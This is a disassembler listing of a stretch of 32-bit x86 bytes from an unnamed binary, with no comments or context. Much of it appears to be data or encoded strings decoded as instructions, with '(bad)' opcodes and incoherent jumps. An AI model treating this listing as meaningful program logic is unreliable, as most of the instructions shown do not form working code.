  421a05:	add    BYTE PTR [eax],dh
  421a07:	adc    DWORD PTR [edx],edx
  421a09:	add    BYTE PTR [eax],al
  421a0b:	add    BYTE PTR [eax],al
  421a0d:	add    BYTE PTR [eax],al
  421a0f:	nop
  421a10:	inc    edx
  421a11:	add    BYTE PTR [eax+edx*4],al
  421a14:	inc    edx
  421a15:	add    BYTE PTR [eax],cl
  421a17:	nop
  421a18:	inc    edx
  421a19:	add    BYTE PTR [eax+edx*4],cl
  421a1c:	inc    edx
  421a1d:	add    BYTE PTR [eax],dl
  421a1f:	nop
  421a20:	inc    edx
  421a21:	add    BYTE PTR [eax+edx*4],dl
  421a24:	inc    edx
  421a25:	add    BYTE PTR [eax],bl
  421a27:	nop
  421a28:	inc    edx
  421a29:	add    BYTE PTR [eax+edx*4],bl
  421a2c:	inc    edx
  421a2d:	add    BYTE PTR [eax],al
  421a2f:	mov    al,ds:0xa0040042
  421a34:	inc    edx
  421a35:	add    BYTE PTR [eax],cl
  421a37:	mov    al,ds:0xa00c0042
  421a3c:	inc    edx
  421a3d:	add    BYTE PTR [eax],dl
  421a3f:	mov    al,ds:0xa0140042
  421a44:	inc    edx
  421a45:	add    BYTE PTR [eax],bl
  421a47:	mov    al,ds:0xa01c0042
  421a4c:	inc    edx
  421a4d:	add    BYTE PTR [eax],al
  421a4f:	mov    al,0x42
  421a51:	add    BYTE PTR [eax+esi*4],al
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	mov    al,0x42
  421a59:	add    BYTE PTR [eax+esi*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	mov    al,0x42
  421a61:	add    BYTE PTR [eax+esi*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	mov    al,0x42
  421a69:	add    BYTE PTR [eax+esi*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax+0x66],bh
  421a70:	ins    BYTE PTR es:[edi],dx
  421a71:	jp     0x421aca
  421a73:	jbe    0x421abc
  421a75:	ja     0x421aba
  421a77:	js     0x421ac1
  421a79:	jno    0x421ade
  421a7b:	inc    edx
  421a7c:	inc    bx
  421a7e:	push   ebp
  421a7f:	jno    0x421af7
  421a81:	ja     0x421aea
  421a83:	dec    edi
  421a84:	dec    esp
  421a85:	dec    ebp
  421a86:	inc    edx
  421a87:	jno    0x421afa
  421a89:	jae    0x421ade
  421a8b:	push   eax
  421a8c:	arpl   WORD PTR [ebx+0x36],dx
  421a8f:	push   ds
  421a90:	inc    edx
  421a91:	add    BYTE PTR [esi],bh
  421a93:	push   ds
  421a94:	inc    edx
  421a95:	add    dh,dl
  421a97:	sbb    al,0x42
  421a99:	add    bh,ch
  421a9b:	or     esi,DWORD PTR [edx+0x304e790e]
  421aa1:	dec    esi
  421aa2:	xchg   DWORD PTR [edi+0x3d],ecx
  421aa5:	dec    esi
  421aa6:	scas   eax,DWORD PTR es:[edi]
  421aa7:	dec    edi
  421aa8:	ds dec esi
  421aaa:	js     0x421afa
  421aac:	cmp    ecx,DWORD PTR [esi-0x64]
  421aaf:	dec    edi
  421ab0:	inc    esp
  421ab1:	dec    esi
  421ab2:	jae    0x421b02
  421ab4:	inc    ecx
  421ab5:	dec    esi
  421ab6:	xor    BYTE PTR [esi+0x40],cl
  421ab9:	dec    esi
  421aba:	pop    esp
  421abb:	pop    ebp
  421abc:	pop    edi
  421abd:	push   edx
  421abe:	cmp    DWORD PTR [esi+0x79],ecx
  421ac1:	dec    esi
  421ac2:	xor    BYTE PTR [esi-0x79],cl
  421ac5:	dec    edi
  421ac6:	cmp    eax,0x3e4faf4e
  421acb:	dec    esi
  421acc:	js     0x421b1c
  421ace:	cmp    ecx,DWORD PTR [esi-0x64]
  421ad1:	dec    edi
  421ad2:	inc    esp
  421ad3:	dec    esi
  421ad4:	mov    DWORD PTR [edi+0x41],ecx
  421ad7:	dec    esi
  421ad8:	xor    BYTE PTR [esi+0x40],cl
  421adb:	dec    esi
  421adc:	pop    esp
  421add:	ins    DWORD PTR es:[edi],dx
  421ade:	pop    edi
  421adf:	bound  edi,QWORD PTR [ecx]
  421ae1:	dec    esi
  421ae2:	jns    0x421b32
  421ae4:	xor    BYTE PTR [esi-0x80],cl
  421ae7:	dec    edi
  421ae8:	cmp    eax,0x394e734e
  421aed:	dec    esi
  421aee:	mov    ds:0x304e3a4f,al
  421af3:	dec    esi
  421af4:	inc    esi
  421af5:	dec    esi
  421af6:	pop    esp
  421af7:	jge    0x421b58
  421af9:	jb     0x421b6a
  421afb:	sub    BYTE PTR [esi-0x7d],0x7e
  421aff:	xchg   ebx,eax
  421b00:	jns    0x421a92
  421b02:	aas    
  421b03:	dec    esi
  421b04:	test   BYTE PTR [edi+0x30],cl
  421b07:	dec    esi
  421b08:	test   BYTE PTR [edi+0x3c],cl
  421b0b:	dec    esi
  421b0c:	mov    ds:0x734e394f,al
  421b11:	dec    esi
  421b12:	inc    ebp
  421b13:	dec    esi
  421b14:	xor    BYTE PTR [esi+0x44],cl
  421b17:	dec    esi
  421b18:	pop    esp
  421b19:	lea    ebx,[edi-0x7e]
  421b1c:	outs   dx,DWORD PTR ds:[esi]
  421b1d:	xchg   edx,eax
  421b1e:	outs   dx,BYTE PTR ds:[esi]
  421b1f:	xchg   ebx,eax
  421b20:	jle    0x421ac5
  421b22:	jns    0x421ac4
  421b24:	aas    
  421b25:	dec    esi
  421b26:	test   BYTE PTR [edi+0x30],cl
  421b29:	dec    esi
  421b2a:	test   BYTE PTR [edi+0x3c],cl
  421b2d:	dec    esi
  421b2e:	mov    ds:0x894e394f,al
  421b33:	dec    edi
  421b34:	inc    ebp
  421b35:	dec    esi
  421b36:	xor    BYTE PTR [esi+0x44],cl
  421b39:	dec    esi
  421b3a:	pop    esp
  421b3b:	popf   
  421b3c:	pop    edi
  421b3d:	xchg   edx,eax
  421b3e:	outs   dx,DWORD PTR ds:[esi]
  421b3f:	mov    ds:0xb37ea36e,al
  421b44:	jns    0x421af6
  421b46:	aas    
  421b47:	dec    esi
  421b48:	mov    cs,WORD PTR [edi+0x30]
  421b4b:	dec    esi
  421b4c:	lods   al,BYTE PTR ds:[esi]
  421b4d:	dec    edi
  421b4e:	cmp    eax,0x394e734e
  421b53:	dec    esi
  421b54:	mov    eax,ds:0x304e3a4f
  421b59:	dec    esi
  421b5a:	inc    esp
  421b5b:	dec    esi
  421b5c:	pop    esp
  421b5d:	lods   eax,DWORD PTR ds:[esi]
  421b5e:	pop    edi
  421b5f:	mov    ds:0xb36eb26f,al
  421b64:	jle    0x421b29
  421b66:	jns    0x421b28
  421b68:	aas    
  421b69:	dec    esi
  421b6a:	mov    cs,WORD PTR [edi+0x30]
  421b6d:	dec    esi
  421b6e:	lods   al,BYTE PTR ds:[esi]
  421b6f:	dec    edi
  421b70:	cmp    eax,0x394e7e4e
  421b75:	dec    esi
  421b76:	lahf   
  421b77:	dec    edi
  421b78:	cmp    ecx,DWORD PTR [esi+0x30]
  421b7b:	dec    esi
  421b7c:	inc    ebp
  421b7d:	dec    esi
  421b7e:	pop    esp
  421b7f:	mov    ebp,0xc26fb25f
  421b84:	outs   dx,BYTE PTR ds:[esi]
  421b85:	ret    
  421b86:	jle    0x421b5b
  421b88:	jns    0x421b5a
  421b8a:	aas    
  421b8b:	dec    esi
  421b8c:	mov    cs,WORD PTR [edi+0x30]
  421b8f:	dec    esi
  421b90:	lods   al,BYTE PTR ds:[esi]
  421b91:	dec    edi
  421b92:	cmp    eax,0x394f804e
  421b97:	dec    esi
  421b98:	lods   al,BYTE PTR ds:[esi]
  421b99:	dec    edi
  421b9a:	cmp    cl,BYTE PTR [esi+0x30]
  421b9d:	dec    esi
  421b9e:	inc    esi
  421b9f:	dec    esi
  421ba0:	pop    esp
  421ba1:	int    0x5f
  421ba3:	ret    0xd26f
  421ba6:	outs   dx,BYTE PTR ds:[esi]
  421ba7:	sar    DWORD PTR [esi-0x1d],cl
  421baa:	jns    0x421b8c
  421bac:	aas    
  421bad:	dec    esi
  421bae:	mov    cs,WORD PTR [edi+0x30]
  421bb1:	dec    esi
  421bb2:	lods   al,BYTE PTR ds:[esi]
  421bb3:	dec    edi
  421bb4:	cmp    eax,0x394f834e
  421bb9:	dec    esi
  421bba:	mov    ds:0x304e3a4f,al
  421bbf:	dec    esi
  421bc0:	inc    esp
  421bc1:	dec    esi
  421bc2:	pop    esp
  421bc3:	fstp   QWORD PTR [edi-0x2e]
  421bc6:	outs   dx,DWORD PTR ds:[esi]
  421bc7:	loop   0x421c37
  421bc9:	jecxz  0x421c49
  421bcb:	repz jns 0x421bbe
  421bce:	aas    
  421bcf:	dec    esi
  421bd0:	lea    ecx,[edi+0x30]
  421bd3:	dec    esi
  421bd4:	lahf   
  421bd5:	dec    edi
  421bd6:	cmp    eax,0x3c4fa04e
  421bdb:	dec    esi
  421bdc:	xor    BYTE PTR [esi+0x3f],cl
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	in     eax,dx
  421be2:	pop    edi
  421be3:	loop   0x421c54
  421be5:	repnz outs dx,BYTE PTR ds:[esi]
  421be7:	repz jle 0x421bed
  421bea:	jns    0x421bec
  421bec:	jle    0x421c01
  421bee:	jns    0x421c00
  421bf0:	cmp    al,0x4e
  421bf2:	jg     0x421c42
  421bf4:	xor    BYTE PTR [esi-0x65],cl
  421bf7:	dec    edi
  421bf8:	xor    cl,BYTE PTR [esi-0x80]
  421bfb:	dec    edi
  421bfc:	cmp    al,0x4e
  421bfe:	lods   eax,DWORD PTR ds:[esi]
  421bff:	dec    edi
  421c00:	cmp    ecx,DWORD PTR [esi+0x30]
  421c03:	dec    esi
  421c04:	inc    ebp
  421c05:	dec    esi
  421c06:	pop    esp
  421c07:	or     eax,0x126f025f
  421c0c:	outs   dx,BYTE PTR ds:[esi]
  421c0d:	adc    edi,DWORD PTR [esi+0x23]
  421c10:	jns    0x421c32
  421c12:	aas    
  421c13:	dec    esi
  421c14:	add    BYTE PTR [eax],al
  421c16:	sahf   
  421c17:	sbb    al,BYTE PTR [edx+0x0]
  421c1a:	xchg   edx,eax
  421c1b:	sbb    al,0x42
  421c1d:	add    BYTE PTR [edx+0x4200421c],bl
  421c23:	push   ds
  421c24:	inc    edx
  421c25:	add    BYTE PTR [esi+0x3200421d],ch
  421c2b:	push   ds
  421c2c:	inc    edx
  421c2d:	add    BYTE PTR [edx+0x1c],bh
  421c30:	inc    edx
  421c31:	add    BYTE PTR [esi+0x1c],bh
  421c34:	inc    edx
  421c35:	add    BYTE PTR [esi],ch
  421c37:	push   ds
  421c38:	inc    edx
  421c39:	add    dl,ah
  421c3b:	sbb    al,0x42
  421c3d:	add    BYTE PTR ds:0x36f89ca9,cl
  421c43:	mov    edx,0x1c96f89c
  421c48:	inc    edx
  421c49:	add    BYTE PTR [esi+0x1d],ah
  421c4c:	inc    edx
  421c4d:	add    BYTE PTR [edx+0x1d],bh
  421c50:	inc    edx
  421c51:	add    BYTE PTR [esi-0x69ffbde3],al
  421c57:	sbb    eax,0x1cce0042
  421c5c:	inc    edx
  421c5d:	add    BYTE PTR [edx-0x11ffbde6],bl
  421c63:	sbb    al,0x42
  421c65:	add    dh,bl
  421c67:	sbb    al,0x42
  421c69:	add    BYTE PTR [esi+0x1e],al
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [esi+0x19f89c85],dh
  421c73:	or     edx,DWORD PTR [edi]
  421c75:	and    DWORD PTR [edx+0x1400421c],0x881161c
  421c7f:	or     eax,0x705
  421c84:	inc    eax
  421c85:	add    BYTE PTR [edx],bh
  421c87:	inc    edx
  421c88:	ds ds enter 0x4279,0x0
  421c8e:	ins    DWORD PTR es:[edi],dx
  421c8f:	push   ebp
  421c90:	inc    esp
  421c91:	imul   ecx,DWORD PTR [eax],0x86275fa
  421c97:	in     eax,dx
  421c98:	inc    BYTE PTR [edi]
  421c9a:	aas    
  421c9b:	cli    
  421c9c:	mov    ds:0x421c8a05,eax
  421ca1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ca7:	xchg   esi,eax
  421ca8:	pushf  
  421ca9:	clc    
  421caa:	mov    ah,0x95
  421cac:	pushf  
  421cad:	clc    
  421cae:	mov    ebx,0xbaf89c95
  421cb3:	xchg   ebp,eax
  421cb4:	pushf  
  421cb5:	clc    
  421cb6:	mov    ecx,0xb8f89c95
  421cbb:	xchg   ebp,eax
  421cbc:	pushf  
  421cbd:	clc    
  421cbe:	mov    edi,0xbef89c95
  421cc3:	xchg   ebp,eax
  421cc4:	pushf  
  421cc5:	clc    
  421cc6:	mov    ebp,0xa6f89c95
  421ccb:	xchg   ebp,eax
  421ccc:	pushf  
  421ccd:	clc    
  421cce:	jmp    0x421a:0x926003f9
  421cd5:	add    BYTE PTR [eax+eax*2+0x42],ch
  421cd9:	add    BYTE PTR [ebx+0x77],dl
  421cdc:	jbe    0x421d2e
  421cde:	mov    dh,0x85
  421ce0:	pushf  
  421ce1:	clc    
  421ce2:	sbb    ecx,ebp
  421ce4:	push   eax
  421ce5:	pop    es
  421ce6:	sbb    BYTE PTR [ebx],cl
  421ce8:	add    BYTE PTR [eax],al
  421cea:	mov    ds,WORD PTR [edx]
  421cec:	inc    edx
  421ced:	add    BYTE PTR [ebx],bl
  421cef:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d22:	ins    BYTE PTR es:[edi],dx
  421d23:	inc    eax
  421d24:	inc    edx
  421d25:	add    BYTE PTR [esi+0x66f89c85],dh
  421d2b:	add    BYTE PTR [edx+0x0],ch
  421d2e:	add    BYTE PTR [si+0x0],ah
  421d32:	push   0x64006700
  421d37:	add    BYTE PTR [esi+0x0],ah
  421d3a:	push   0x0
  421d3c:	push   0x66006400
  421d41:	add    BYTE PTR [edi+0x0],ah
  421d44:	push   0x0
  421d46:	push   0x66006700
  421d4b:	add    BYTE PTR [eax+0x0],ch
  421d4e:	add    BYTE PTR [bp+0x0],ah
  421d52:	push   0x66006700
	...
  421d5f:	add    BYTE PTR [eax],al
  421d61:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421d67:	dec    edi
  421d68:	lahf   
  421d69:	dec    edi
  421d6a:	mov    ds:0x9f4fa64f,al
  421d6f:	dec    edi
  421d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d71:	dec    edi
  421d72:	ins    DWORD PTR es:[edi],dx
  421d73:	dec    esi
  421d74:	bound  ecx,QWORD PTR [esi+0x30]
  421d77:	dec    esi
  421d78:	add    BYTE PTR [eax],al
  421d7a:	cdq    
  421d7b:	dec    edi
  421d7c:	pushf  
  421d7d:	dec    edi
  421d7e:	fwait
  421d7f:	dec    edi
  421d80:	ins    DWORD PTR es:[edi],dx
  421d81:	dec    esi
  421d82:	bound  ecx,QWORD PTR [esi+0x30]
  421d85:	dec    esi
  421d86:	scas   eax,DWORD PTR es:[edi]
  421d87:	dec    edi
  421d88:	lods   eax,DWORD PTR ds:[esi]
  421d89:	dec    edi
  421d8a:	lahf   
  421d8b:	dec    edi
  421d8c:	mov    ds:0x624e6d4f,al
  421d91:	dec    esi
  421d92:	xor    BYTE PTR [esi+0x0],cl
  421d95:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421d9b:	dec    edi
  421d9c:	test   eax,0xa04f934f
  421da1:	dec    edi
  421da2:	fwait
  421da3:	dec    edi
  421da4:	xor    BYTE PTR [esi+0x0],cl
  421da7:	add    BYTE PTR [eax],al
  421da9:	add    BYTE PTR [eax],al
  421dab:	add    BYTE PTR [eax],al
  421dad:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421db4:	mov    WORD PTR [ebp-0x32734274],gs
  421dba:	mov    ebp,ds
  421dbc:	mov    ebp,gs
  421dbe:	mov    ebp,?
  421dc0:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421dc6:	mov    WORD PTR ds:0x6d8c5d8c,?
  421dcc:	mov    WORD PTR [edx-0x74],?
  421dcf:	jae    0x421d5d
  421dd1:	jo     0x421d5f
  421dd3:	jno    0x421d61
  421dd5:	jbe    0x421d63
  421dd7:	ja     0x421d65
  421dd9:	je     0x421d67
  421ddb:	jne    0x421d69
  421ddd:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421de4:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421dea:	lods   al,BYTE PTR ds:[esi]
  421deb:	jge    0x421da9
  421ded:	jge    0x421d8d
  421def:	(bad)  
  421df0:	jns    0x421e65
  421df2:	mov    ecx,0x7d738cb1
  421df7:	ins    DWORD PTR es:[edi],dx
  421df8:	enter  0x9fc6,0x26
  421dfc:	jb     0x421e01
  421dfe:	test   eax,0xb956bb17
  421e03:	hlt    
  421e04:	test   al,0x37
  421e06:	test   al,0x7e
  421e08:	fnstenv [ecx-0x6a]
  421e0b:	mov    cl,0x6a
  421e0d:	push   0xffffffce
  421e0f:	or     BYTE PTR [edx],bl
  421e11:	xlat   BYTE PTR ds:[ebx]
  421e12:	out    dx,eax
  421e13:	add    eax,0x9321d7aa
  421e18:	scas   al,BYTE PTR es:[edi]
  421e19:	adc    DWORD PTR [esi],esp
  421e1b:	jge    0x421e40
  421e1d:	fidiv  WORD PTR [edi]
  421e1f:	leave  
  421e20:	hlt    
  421e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e22:	cmp    ax,0x1fc8
  421e26:	mov    dh,cl
  421e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e29:	(bad)  
  421e2a:	and    DWORD PTR [eax],ebx
  421e2c:	and    DWORD PTR [ecx-0x18],esi
  421e2f:	(bad)  [ebx+0x7]
  421e32:	cmc    
  421e33:	enter  0x301a,0x14
  421e37:	inc    eax
  421e38:	inc    edx
  421e39:	add    BYTE PTR [ecx+0x66],dh
  421e3c:	jp     0x421eac
  421e3e:	sbb    BYTE PTR [edx+eax*2],0x0
  421e42:	out    0x1c,al
  421e44:	inc    edx
  421e45:	add    BYTE PTR [eax],cl
  421e47:	in     eax,dx
  421e48:	adc    al,BYTE PTR [edi]
  421e4a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e51:	ins    BYTE PTR es:[edi],dx
  421e52:	push   0x49657557
  421e57:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e5d:	push   edi
  421e5e:	jp     0x421eda
  421e60:	dec    ebp
  421e61:	push   esi
  421e62:	arpl   WORD PTR gs:[ecx+0x45],si
  421e66:	dec    edx
  421e67:	dec    esi
  421e68:	data16 ja 0x421eb9
  421e6b:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421e86:	inc    ebp
  421e87:	push   edx
  421e88:	jb     0x421efe
  421e8a:	inc    esi
  421e8b:	je     0x421ece
  421e8d:	inc    esi
  421e8e:	jae    0x421f06
  421e90:	dec    ebx
  421e91:	gs dec ecx
  421e93:	dec    ebp
  421e94:	dec    ebp
  421e95:	pop    edx
  421e96:	jp     0x421ef2
  421e98:	jbe    0x421ee0
  421e9a:	pop    ecx
  421e9b:	jo     0x421f15
  421e9d:	inc    edi
  421e9e:	gs ins BYTE PTR es:[edi],dx
  421ea0:	dec    esp
  421ea1:	js     0x421f0b
  421ea3:	inc    edx
  421ea4:	js     0x421eec
  421ea6:	dec    eax
  421ea7:	inc    ebp
  421ea8:	inc    esp
  421ea9:	inc    esp
  421eaa:	push   ecx
  421eab:	dec    edx
  421eac:	ins    BYTE PTR es:[edi],dx
  421ead:	dec    ebx
  421eae:	jbe    0x421f1e
  421eb0:	pop    eax
  421eb1:	jbe    0x421efe
  421eb3:	inc    ecx
  421eb4:	fs gs jno 0x421f25
  421eb8:	push   ebx
  421eb9:	inc    ecx
  421eba:	add    BYTE PTR [eax],al
  421ebc:	inc    ebx
  421ebd:	outs   dx,BYTE PTR ds:[esi]
  421ebe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421ec2:	push   edx
  421ec3:	push   ecx
  421ec4:	push   0x74000064
  421ec9:	jne    0x421f40
  421ecb:	ins    DWORD PTR es:[edi],dx
  421ecc:	push   ecx
  421ecd:	push   eax
  421ece:	jo     0x421f4a
  421ed0:	addr16 jo 0x421f29
  421ed3:	pop    eax
  421ed4:	add    BYTE PTR [eax],al
  421ed6:	push   ecx
  421ed7:	pop    ecx
  421ed8:	inc    ebx
  421ed9:	inc    edx
  421eda:	outs   dx,BYTE PTR ds:[esi]
  421edb:	popa   
  421edc:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421ee0:	jne    0x421f50
  421ee2:	dec    ebx
  421ee3:	je     0x421f48
  421ee5:	bound  esp,QWORD PTR [edi+0x0]
  421ee8:	jns    0x421f2f
  421eea:	bound  ebp,QWORD PTR [ecx+0x46]
  421eed:	dec    ecx
  421eee:	ja     0x421f35
  421ef0:	dec    eax
  421ef1:	inc    ebp
  421ef2:	inc    edx
  421ef3:	push   ebx
  421ef4:	add    BYTE PTR [eax],al
  421ef6:	outs   dx,DWORD PTR ds:[esi]
  421ef7:	inc    edi
  421ef8:	dec    esi
  421ef9:	outs   dx,DWORD PTR ds:[esi]
  421efa:	pop    ecx
  421efb:	inc    edi
  421efc:	jb     0x421f45
  421efe:	jns    0x421f76
  421f00:	inc    ecx
  421f01:	pop    eax
  421f02:	dec    esp
  421f03:	add    BYTE PTR [eax+0x48],bh
  421f06:	bound  edx,QWORD PTR [ebx+0x43]
  421f09:	pop    eax
  421f0a:	outs   dx,DWORD PTR ds:[esi]
  421f0b:	push   0x4355
  421f10:	dec    esp
  421f11:	ins    BYTE PTR es:[edi],dx
  421f12:	inc    edx
  421f13:	push   0x76666a73
  421f18:	inc    edx
  421f19:	jo     0x421f1b
  421f1b:	add    BYTE PTR [eax],al
  421f1d:	add    BYTE PTR [edi+0x6d],ah
  421f20:	je     0x421f69
  421f22:	ins    BYTE PTR es:[edi],dx
  421f23:	jae    0x421f8f
  421f25:	inc    esi
  421f26:	ins    DWORD PTR es:[edi],dx
  421f27:	je     0x421f7f
  421f29:	push   0x56584178
  421f2e:	push   ebx
  421f2f:	addr16 dec edx
  421f31:	jo     0x421fa5
  421f33:	js     0x421fa4
  421f35:	pop    eax
  421f36:	dec    ebx
  421f37:	push   esp
  421f38:	dec    esp
  421f39:	jns    0x421f86
  421f3b:	js     0x421fb5
  421f3d:	outs   dx,BYTE PTR ds:[esi]
  421f3e:	pop    ecx
  421f3f:	jae    0x421faf
  421f41:	push   0x43644448
  421f46:	arpl   WORD PTR [edx+0x55],sp
  421f49:	push   0x42504e67
  421f4e:	push   ebp
  421f4f:	je     0x421fc6
  421f51:	addr16 dec edi
  421f53:	dec    esp
  421f54:	inc    edx
  421f55:	ins    DWORD PTR es:[edi],dx
  421f56:	inc    esi
  421f57:	inc    esi
  421f58:	inc    esi
  421f59:	arpl   WORD PTR [edx+0x47],bx
  421f5c:	push   ebp
  421f5d:	inc    ebx
  421f5e:	popa   
  421f5f:	push   edx
  421f60:	dec    esp
  421f61:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421f68:	push   ecx
  421f69:	push   ebx
  421f6a:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421f71:	dec    edx
  421f72:	jns    0x421fdd
  421f74:	push   edx
  421f75:	inc    ebx
  421f76:	jo     0x421fed
  421f78:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421f7c:	fs push ebx
  421f7e:	inc    ebx
  421f7f:	push   ebp
  421f80:	push   eax
  421f81:	ja     0x421fbe
  421f83:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421f87:	mov    ebp,0xa53ddffb
  421f8c:	js     0x421f47
  421f8e:	in     al,0xcb
  421f90:	(bad)  
  421f91:	add    eax,0x1d709
  421f96:	bound  eax,QWORD PTR [eax]
  421f98:	add    BYTE PTR [eax],al
  421f9a:	pop    eax
  421f9b:	jns    0x422016
  421f9d:	pop    esi
  421f9e:	nop
  421f9f:	push   es
  421fa0:	inc    ecx
  421fa1:	jnp    0x421f29
  421fa3:	fadd   QWORD PTR ds:0x4c2ab16c
  421fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421faa:	dec    esp
  421fab:	scas   eax,DWORD PTR es:[edi]
  421fac:	dec    edx
  421fad:	sbb    BYTE PTR [ebx-0x501cecf4],bl
  421fb3:	ss call 0xb84baea5
  421fb9:	pop    ebx
  421fba:	mov    ch,0xab
  421fbc:	jnp    0x421fe9
  421fbe:	pop    es
  421fbf:	(bad)  
  421fc1:	les    ebx,FWORD PTR ds:0x8816546c
  421fc7:	push   ebp
  421fc8:	repnz int3 
  421fca:	call   0x8225:0xd40cb8f3
  421fd1:	sbb    dh,dh
  421fd3:	inc    esp
  421fd4:	inc    ecx
  421fd5:	outs   dx,BYTE PTR ds:[esi]
  421fd6:	push   es
  421fd7:	pop    esp
  421fd8:	adc    DWORD PTR [edi-0x2590c133],esi
  421fde:	mov    ah,dl
  421fe0:	dec    ecx
  421fe1:	cs stos DWORD PTR es:[edi],eax
  421fe3:	xchg   esi,eax
  421fe4:	lods   eax,DWORD PTR ds:[esi]
  421fe5:	inc    ebp
  421fe6:	jecxz  0x421f77
  421fe8:	mov    eax,0x9a95256b
  421fed:	cmp    esi,DWORD PTR ds:0x35397117
  421ff3:	mov    ch,0x3f
  421ff5:	mov    dh,0xce
  421ff7:	shl    BYTE PTR [eax+0xfa1c58],0x0
  421ffe:	add    BYTE PTR [eax],al
  422000:	add    BYTE PTR [eax],al
  422002:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422008:	(bad)  
  422009:	cli    
  42200a:	jl     0x422070
  42200c:	xlat   BYTE PTR ds:[ebx]
  42200d:	push   esi
  42200e:	or     BYTE PTR [ecx-0x28942d06],ah
  422014:	add    DWORD PTR [eax],eax
  422016:	bound  eax,QWORD PTR [eax]
  422018:	add    BYTE PTR [eax],al
  42201a:	ror    BYTE PTR [esi+0x6c766eee],0xca
  422021:	pop    ss
  422022:	add    ebx,DWORD PTR [esi+ebp*8+0x71]
  422026:	xchg   BYTE PTR [ebp+0x5b],ch
  422029:	into   
  42202a:	outs   dx,DWORD PTR ds:[esi]
  42202b:	loopne 0x4220a7
  42202d:	cmp    eax,0x2f583b66
  422032:	adc    eax,esp
  422034:	inc    edx
  422035:	and    ecx,ebp
  422037:	fldcw  WORD PTR [edx-0x46]
  42203a:	fs pop ebx
  42203c:	call   0xcc28b4ef
  422041:	cmp    DWORD PTR [esi+0xc],esi
  422044:	cmp    ecx,DWORD PTR [esi+0x52]
  422047:	jb     0x422006
  422049:	call   0x28c4:0xd81b1760
  422050:	loop   0x42206e
  422052:	call   0x541e:0x78c532ca
  422059:	fld    QWORD PTR [ecx]
  42205b:	adc    DWORD PTR [ecx],0x38
  42205e:	sbb    eax,0x5d72cfa6
  422063:	dec    edx
  422064:	psraw  mm2,QWORD PTR [ebx+eiz*4-0x11084cd8]
  42206c:	or     BYTE PTR [ebx],dl
  42206e:	pop    eax
  42206f:	es xchg ebx,eax
  422071:	fimul  DWORD PTR [ebp+0x666e0bd1]
  422077:	outs   dx,DWORD PTR ds:[esi]
  422078:	pop    ss
  422079:	jg     0x422026
  42207b:	or     DWORD PTR [eax],eax
  42207d:	add    BYTE PTR [eax],al
  42207f:	add    BYTE PTR [eax],al
  422081:	add    BYTE PTR [ebx-0x7e80ab],dh
  422087:	stos   DWORD PTR es:[edi],eax
  422088:	push   DWORD PTR [edi-0x42]
  42208b:	xchg   esi,eax
  42208c:	push   0xdb8b2f57
  422091:	leave  
  422092:	int    0xd7
  422094:	add    DWORD PTR [eax],eax
  422096:	bound  eax,QWORD PTR [eax]
  422098:	add    BYTE PTR [eax],al
  42209a:	or     bh,BYTE PTR [ecx-0x55]
  42209d:	mov    bh,0xf4
  42209f:	mov    al,BYTE PTR [esp+edx*1]
  4220a2:	test   eax,0x189b6bc2
  4220a7:	mov    edx,0x7b246368
  4220ac:	das    
  4220ad:	or     BYTE PTR [ecx-0x13602279],cl
  4220b3:	mov    bh,0x5e
  4220b5:	adc    edx,DWORD PTR [ebp-0xc]
  4220b8:	jne    0x422089
  4220ba:	pop    edi
  4220bb:	mov    BYTE PTR [esi-0x1d],0x54
  4220bf:	xchg   esi,eax
  4220c0:	shl    DWORD PTR [ecx-0x13ce481e],cl
  4220c6:	xchg   ecx,eax
  4220c7:	sub    al,0x6f
  4220c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ca:	add    al,0x2c
  4220cc:	dec    ecx
  4220cd:	mov    ecx,0x936ec276
  4220d2:	in     al,0xd1
  4220d4:	loop   0x422075
  4220d6:	iret   
  4220d7:	test   ch,0xd
  4220da:	lds    esp,FWORD PTR [ebp-0x63a87736]
  4220e0:	mov    dh,0x9d
  4220e2:	sub    ebx,esp
  4220e4:	pop    esp
  4220e5:	mov    ah,0x7e
  4220e7:	sti    
  4220e8:	not    BYTE PTR [edx-0x4a]
  4220eb:	jmp    0x92e5:0xe6beac70
  4220f2:	sti    
  4220f3:	add    cl,BYTE PTR [ebx+0x79]
  4220f6:	in     eax,dx
  4220f7:	pop    ss
  4220f8:	and    edi,ecx
  4220fa:	add    DWORD PTR ds:0x0,0xd6380000
  422104:	cmp    ah,BYTE PTR [esi+edi*8]
  422107:	in     al,dx
  422108:	fimul  WORD PTR ds:[edi+0x25ac6bd5]
  42210f:	daa    
  422110:	jo     0x4220bd
  422112:	das    
  422113:	fadd   DWORD PTR [ecx]
  422115:	add    BYTE PTR [edx+0x0],ah
  422118:	add    BYTE PTR [eax],al
  42211a:	les    ebp,FWORD PTR [ebx]
  42211c:	or     BYTE PTR [esi],dh
  42211e:	les    eax,FWORD PTR [edi]
  422120:	sahf   
  422121:	pop    edi
  422122:	out    dx,eax
